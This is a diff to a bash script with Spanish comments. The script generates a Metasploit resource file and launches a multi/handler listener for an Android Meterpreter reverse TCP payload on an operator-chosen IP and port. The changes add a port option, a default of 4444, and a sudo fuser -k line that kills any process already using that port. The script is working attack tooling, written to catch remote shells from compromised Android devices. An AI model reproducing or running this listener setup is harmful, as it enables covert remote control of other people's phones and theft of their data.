@@ -8,11 +8,14 @@ usage() {
 
 # Inicializar la variable LOCAL_IP
 LOCAL_IP=""
+PORT=""
 
 # Procesar argumentos de línea de comandos
 while [[ "$#" -gt 0 ]]; do
     case $1 in
         -ip) LOCAL_IP="$2"; shift ;;
+        -port) PORT="$2"; shift ;;
+        -h|--help) usage ;;
         *) usage ;;
     esac
     shift
@@ -29,13 +32,26 @@ if [[ -z "$LOCAL_IP" ]]; then
     usage
 fi
 
+# Si no se proporcionó un puerto, usar un valor predeterminado
+if [[ -z "$PORT" ]]; then
+    # Eliminamos los procesos que estén utilizando el puerto 4444
+    sudo fuser -k 4444/tcp &>/dev/null
+    PORT=4444
+fi
+
+# Verificamos si el puerto es válido
+if [[ ! "$PORT" =~ ^[0-9]+$ ]]; then
+    echo -e "\e[31mEl puerto no es válido.\e[0m"
+    usage
+fi
+
 # Generar el archivo config.rc con la IP local
 cat <<EOL > config.rc
 use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set LHOST $LOCAL_IP
-set LPORT 4444
-exploit -j
+set LPORT $PORT
+exploit
 EOL
 
 # Ejecutar Metasploit con el archivo config.rc
